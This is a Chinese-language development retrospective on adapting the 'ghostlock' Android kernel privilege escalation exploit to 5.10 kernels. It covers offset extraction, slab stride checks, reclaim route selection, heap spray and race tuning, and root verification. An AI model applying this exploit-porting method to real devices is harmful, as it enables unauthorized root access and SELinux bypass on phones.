# 新增一个内核适配的完整链路

> 本文不是理论流程，而是**5.10 适配的复盘** —— 每一个阶段都对应一次真实提交。
> 上游基线 `84087d0` 只含 6.1 / 6.6 / 6.12（**共 39 个变体，没有任何 5.x**），
> 所以这条路是从零开出来的，踩到的坑具有代表性。

---

## 全局图

```
① 提取偏移  ──→  ② 加诊断  ──→  ③ 校准偏移  ──→  ④ 定路线  ──→  ⑤ 调布局  ──→  ⑥ 定参数  ──→  ⑦ 固化回工具
   offsets.h      util.c        offsets.h       util.c        util.c       offsets.h     extract_rs
   e3e05de        8d374f3       20cc8fd         6ded65a       50136e4      fe155cf       53282cf
```

**两个容易被忽略的关键点**：
- **② 加诊断要排在很前面** —— 没有它，后面几步全靠猜。
- **⑦ 把手工发现的参数固化回提取器**，才算闭环；否则每来一个新版本都要人肉再做一遍。

---

## ⚠️ 先读这一节：上面的顺序是"我们怎么走的"，不是"最优顺序"

复盘时发现，**提取器本来就已经具备可行性判定的能力**，我们却仍在手工试错：

```
ensure_rtmutex_43499_unpatched(...)     判定 remove_waiter() 有没有打补丁（exit 6 = 已修）
frame_pselect_dispatch / frame_futex_dispatch      栈帧分析
"pselect/futex overlap is not a non-negative qword: {delta}"   ← 栈重叠判定
pselect_shift                                      自动推导
```

**栈布局是否重叠、shift 应该是多少 —— 工具算得出来。** 我们之所以手工做，是因为
5.10 没有 BTF、提取器当时推不出来（`53282cf` 才补上），于是做了人工兜底。

### 所以正确的顺序是

```
① 先用提取器判可行性（补丁状态 + 栈重叠）      全自动；不通过就没必要继续
② 让提取器具备完整推导能力（含 BTF-less 路径）  ★ 必须在调参之前
③ 自动生成偏移表 --register                    零人工
④ 上机验证；不通过再针对性排查                 人工只做这一步
```

**与上面流程的关键差别**：**⑦ 应该提到 ② 的位置**。

工具能推导时，③④ 都是自动的；**工具不能推导时，你才会被迫手工试错** ——
5.10 上手工试出 shift `-2`（而且还是错的），根因就在这里。

### 但有一个现实约束

**第一次适配某个内核代际时，手工探测不可避免** —— 你得先知道"缺什么能力"，
才知道要补什么。

所以真正的原则是：

> **探索一次，固化一次。**
>
> 手工探测是**一次性成本**；把它固化成工具能力，才是**把成本变成资产**。
> **绝不让同一件事手工做第二遍。**

`53282cf` 就是这条原则的落地：shift 手工试出来后立刻做成自动推导 ——
**再来一个 5.10 变体，一条命令就够。**

**判断一个适配是否真正完成，就看这一点**：换个同代际的新变体，还需要人肉介入吗？

---

## ① 提取偏移表

```bash
cd tools/extract_rs && cargo build --release
./target/release/ghostlock-extract <boot.img|payload.bin|OTA.zip> --register
```

产物落到 `src/kernels/<uname-r>/offsets.h`。

**判据**：输出中不能有**必需符号**解析失败。解析不到就先解决，别带着侥幸往下走。

> 若没有 boot 镜像，见 `VULN_SCOPE.md` 第四节的 5 条替代路径
> （有 root 时 dump kallsyms/config；BTF；OTA；dd 分区；源码重建）。

**对应提交**：`e3e05de`（+15 行，纯新增偏移表，逻辑未动）

---

## ② 先加诊断开关，再开始调

**这一步的价值远超它的成本。**

```c
/* 8d374f3 */
if (getenv("GHOSTLOCK_KS_VERBOSE")) { /* 打印 mm_struct 泄漏的每一轮 */ }
```

**为什么排这么前**：偏移表加进去之后，程序能跑但结果不对 —— 此时若无诊断输出，
你无法区分"偏移错"还是"路线错"还是"参数错"。

**对应提交**：`8d374f3`（+7 行，`GHOSTLOCK_KS_VERBOSE`）

---

## ③ 校准结构偏移（最容易错的一步）

5.10 上踩到的第一个真坑：**`mm_struct` 的 stride 不是 4K 对齐值**。

```
实测：0x400  →  错误
修正：0x3c0  →  正确
```

**怎么确认的**：**用 `slabinfo` 验证**，不是靠猜。

```bash
adb shell 'su -c "cat /proc/slabinfo | grep mm_struct"'
```

**教训**：结构体大小由编译器/配置决定，**同系列内核之间也会不同**（6.1 是 0x400 不代表 5.10 也是）。
凡是"结构体大小 / 数组 stride / 字段偏移"这类量，**必须用设备上的事实去验证**。

**对应提交**：`20cc8fd`（`0x400 → 0x3c0`，注释写明 slabinfo-verified）

### 这一步已自动化

```bash
python3 tools/harness/harness.py stride      # 自动取设备内核 → 选对代码块 → 比对
```

它会读设备 `/proc/slabinfo` 的 `mm_struct` 行，取 `objsize`，
再按设备 `uname -r` 到 `src/kernels/offsets.h` 里**选对应的 `STRUCT_OFFSETS_*` 块**
（这一步很关键：不选块就会取到别的代际的值而误报）。

```
== slabinfo 事实 ==
  · mm_struct  1088 1088 960 34 8 : ...
  · objsize（SLUB stride）= 960 = 0x3C0
  · 设备内核 5.10.149-... → 代码块 STRUCT_OFFSETS_5_10
== 比对 ==
  ✓ 一致：0x3C0 == 960
```

**为什么这件事没有放进 `tools/extract_rs`**：
提取器处理的是**静态镜像**（boot.img / payload.bin），而 **SLUB 的 stride 是运行时属性** ——
镜像里不存在这个值。`btf.rs` 能给出 struct 大小，但那**不是** stride
（5.10 上 BTF 报 0x3e0，实际 stride 是 0x3c0）。
所以它只能由设备事实来核对，属于 harness 的职责。

---

## ④ 确定 reclaim 路线（本代际特有）

**这是最需要读内核源码的一步。**

5.10 的情况：它虽然是 **compact waiter**（照理该走 TCP zerocopy），
但 **TCP 路线在它上面根本不可用**：

```c
/* 6ded65a, src/core/util.c */
/* 5.10 rejects the TCP zerocopy route with EINVAL: tcp_zerocopy_receive()
 * validates zc->address first (find_vma requires a real tcp zerocopy VMA),
 * and the 5.10 struct tcp_zerocopy_receive is only 0x28 bytes, so the
 * waiter_task/fake_lock words at 0x28/0x30 are never copied in.
 * The pselect route reaches SELinux permissive on 5.10; use it by default. */
if (is_5_10_waiter()) return 0;   /* 强制 pselect */
```

**结论与代价**：

| 内核 | 可用路线 |
|---|---|
| 5.10 | **只有 pselect** |
| 6.1 | TCP（默认）/ pselect（`GHOSTLOCK_TCP_ROUTE=0`） |
| 6.6 / 6.12 | pselect |

**5.10 没有备选路线** —— 如果 pselect 的栈布局不重叠，就彻底没戏。
这也解释了为什么"受影响 ≠ 可利用"：能不能走通，取决于**这条唯一路线**在本机的栈布局。

**对应提交**：`6ded65a`（+25/-7，加入路线判定）

### 这一步也能实测，不必读源码

```bash
# 交叉编译后推到设备直接跑（无需 root）
python3 tools/harness/harness.py probe
```

探针只做一次 `getsockopt(TCP_ZEROCOPY_RECEIVE)`，读**内核对 `optlen` 的回写值** ——
因为内核里有 `if (len > sizeof(zc)) len = sizeof(zc);` 再 `put_user(len, optlen)`，
**回写值就是内核真实的 `sizeof(struct tcp_zerocopy_receive)`**。

在 marble（5.10.149）上的实测：

```
sizeof(...) 按本机头文件 = 0x40      ← NDK 的 UAPI（较新）
getsockopt 返回 = -1, errno = 22 (EINVAL)
optlen 回写为 0x28（40）              ← ★ 内核真实的 struct 大小
判定：❌ 内核 struct 只有 0x28，够不到 exploit 需要的 0x38
      → TCP 路线不可用，必须用 pselect
```

**两点值得注意**：

1. **头文件 0x40 ≠ 内核 0x28** —— 所以「靠编译期 `sizeof` 判断」这条路本来就走不通，
   必须问运行中的内核。
2. 判定的**权威依据是 `optlen` 回写值**，而不是"看哪些字节被回写"——
   后者在 `tcp_zerocopy_receive()` 因 `find_vma` 校验失败提前返回时是空的，
   容易误判（探针第一版就踩了这个坑）。

**为什么需要 0x38**：exploit 要把 `waiter->task` / `waiter->lock` 写到 zc 偏移
`0x28` / `0x30`（见 `src/core/fops.c` 的注释），所以要覆盖到 `0x38`。0x28 不够。

---

## ⑤ 调布局相关的量

两个量：

**a) 堆喷射规模** —— 实测**减半**反而更稳（过大降低稳定性）。

**b) waiter 的字布局** —— compact waiter 与 tree waiter 的字段位置不同：

```c
/* 5.10 GKI: rt_mutex_waiter has no wake_state/ww_ctx;
 * prio sits at offset 0x40 directly (6.1 has wake_state@0x40, prio@0x44). */
```

**对应提交**：`50136e4`（+19 行）

### 命中率调优：两个比"调参数"更有效的杠杆

调 `shift` 这类参数属于**事后凑**。真正常被忽略的是下面两个，它们有明确的
物理依据，改起来风险也低。

**杠杆一 · CPU 亲和：用「同簇的两个较高频核」，别用 fallback**

这个漏洞是**两线程竞态**（pselect 落栈 vs futex stale waiter），命中的本质是
**两个线程的时序窗口对齐**。窗口精度直接受核心频率影响；而两个线程若落在
**不同簇**，还会引入调度迁移抖动。

marble（SM7475）实测对照，两组都从**重启后的新鲜状态**起步：

| 组 | 核心对 | 频率 | 结果 |
|---|---|---|---|
| A | `0/1` | 1.80 GHz 小核 | **8 轮全 PANIC，0 命中** |
| B | `4/5` | 2.50 GHz 中核 | **第 1 轮即 SUCCESS** |

本机拓扑（`cpuinfo_max_freq`）：

```
2918400  cpu7        ← 单核簇
2496000  cpu4,5,6    ← 中核簇（3 个）
1804800  cpu0..3     ← 小核簇
```

**注意最高频的 `cpu7` 是单核簇** —— 若只按"最高频"取，会得到 `7/4` 这种**跨簇**
组合。所以 `run` 子命令 的探测规则是：**取成员数 ≥ 2 的最高频簇的前两个核**。
（README 也写 "defaults to the big cores (**fallback** 0/1)"，说明 0/1 本就是兜底值。）

**统计局限，必须说明**：B 组因首轮命中即退出，只跑了 1 轮；且此前在默认 `0/1`
下也命中过。若真实命中率 p=10%，A 组 8 轮全不命中的概率约 43%，并不罕见。
**所以"4/5 显著更优"尚未达到统计显著**，只能说它不差、且符合设计意图。
要下定论需按"每组固定轮数、比较三分类分布"的方式多跑几批。

**杠杆二 · 设备状态：刚启动的存活率是跑一阵后的 3.5 倍**

`ghostlock/` 模块 的实测记录：

```
W1 survival:  ~25%（right after boot）
           →  ~7%（after a long run of panics/oopses）
```

代价只要 ~45 秒一次重启。**这也是"同一套参数有时秒中、有时半天不中"的主因** ——
不是参数变了，是**设备状态变了**。

**判读指标**：`run` 子命令 把每轮分为三类 ——

```
grep "child is root!|self is root"  → HIT
uptime 读不到（设备已重启）          → PANIC (fired, died)
其他                                → SAFE-NO-FIRE
```

其中 **`PANIC` 表示"写发生了但没写对"**。所以调优时应看 `PANIC : SAFE : HIT`
的**分布变化**，而不是只盯着命中与否 —— 几轮就能看出趋势。

**一个真实的诊断例子**：某轮日志显示
`fake_parent=0xffffff802aa2fb90`、`target=0xffffff802aa2fb98`
（正好差 8，即 `selinux_enforcing - 8`），说明**地址算得完全正确**，
崩溃发生在 `pselect pre-select` 之后 —— 于是可断定问题**不在参数、而在时序**，
从而把注意力从"调 shift"转移到"改亲和/状态"上。

---

## ⑥ 定 pselect 的字偏移（最耗时的一步）

`PSELECT_WAITER_WORD_SHIFT` 决定 fd_set 要"打"到 waiter 的哪个字上。

**5.10 上踩的坑**：一开始测出 `-2`，但**那是假象** ——

```c
/* fe155cf */
/* 5.10 pselect_waiter_shift: 0 on stock kernel (-2 was a KP artifact) */
```

**原因**：`-2` 是在**带 KPM 的内核**上测的，KernelPatch 改变了栈布局；
**stock 内核上应该是 `0`**。

**教训**：**测参数时必须在目标内核的原始状态下测**，否则会把自己工具的影响当成内核特性。
这和"改参数一次只改一个"是同一条纪律。

**对应提交**：`fe155cf`（`-2 → 0`，+6/-1）

---

## ⑦ 把发现固化回提取器（闭环）

前六步都是在"手工发现"。这一步把它们**变成工具能力**：

```
53282cf  extract: derive pselect shift on BTF-less kernels (5.10 verified)
         tools/extract_rs/src/main.rs  +73 行
```

**为什么重要**：5.10 GKI **没有 BTF**（`/sys/kernel/btf/vmlinux` 不存在），
原本的 shift 推导依赖 BTF，于是拿不到值 → 只能手工填。

**修好之后**：提取器能**从内核镜像自身**推导出这个值，
下次换一个 5.10 变体，`--register` 一条命令就够，不需要人肉重来。

**这是判断"适配是否真的完成"的标准** —— 能把参数自动化推导出来，才算闭环。

---

## 验收

```bash
# 离线
python3 tools/harness/harness.py check

# 上机（需要命中，1~20 分钟）
python3 tools/harness/harness.py run > gl_run.out 2>&1 &
python3 tools/harness/harness.py root   # 内置独立监视，无需单独开一条线      # 必须另起独立轮询
```

命中后按 `docs/PLAYBOOK.md` 第 5 步收尾，验收三条：

```
su -c id        → gid=0 + context=u:r:magisk:s0
/proc/modules   → kernelpatch ... Live
管理器进程       → 有 UID=0 的子进程
```

---

## 附：新内核适配的检查清单

**「自动化」列标注这一步应当由工具完成，还是必须人工判断。**
原则：**凡是能自动的，就不要手工做第二遍**（见上文"探索一次，固化一次"）。

| # | 做什么 | 判据 | 自动化 | 参考提交 |
|---|---|---|---|---|
| 0 | **判可行性**：补丁状态 + 栈是否重叠 | `remove_waiter()` 仍用 `current`；`pselect/futex` delta 为非负 | ✅ 已自动 | — |
| 1 | 提取偏移并 `--register` | 必需符号无失败 | ✅ 已自动 | `e3e05de` |
| 2 | 加诊断开关 | 能看到每轮的内部状态 | ⚠️ 人工一次，之后复用 | `8d374f3` |
| 3 | 校验结构体大小 / stride | **用 slabinfo 等设备事实验证** | ✅ 已自动（`tools/harness/harness.py stride`，见下） | `20cc8fd` |
| 4 | 确定 reclaim 路线 | **直接探测，不必读源码** | ✅ 已自动（`tools/probe_tcp_route.c`，见下） | `6ded65a` |
| 5 | 调堆喷射与 waiter 字布局 | 稳定命中而非偶发 | ❌ **必须人工** | `50136e4` |
| 6 | 定 shift 等关键参数 | **在 stock 状态下测** | ✅ 已自动（BTF / BTF-less 两条路径） | `fe155cf` / `53282cf` |
| 7 | **固化回提取器（闭环）** | 同代际新变体可一键推导 | — 这是原则，不是步骤 | `53282cf` |

**读法**：
- ✅ **已自动** —— 直接跑，不要手工做
- ⚠️ **可自动但还没做** —— 这就是下一步该补的工具能力
- ❌ **必须人工** —— 与概率/实测相关，没有解析解

**结论：目前唯一真正必须人工的是 ⑤（堆喷射类参数）**，因为它的目标是提高命中率，
只能靠实测定量统计。

**贯穿全程的纪律**：
- 一次只改一个量，否则无法归因
- 参数要在**目标内核的原始状态**下测（别被自己装的东西干扰）
- 能用设备事实验证的（slabinfo / kallsyms / config），不要靠推断
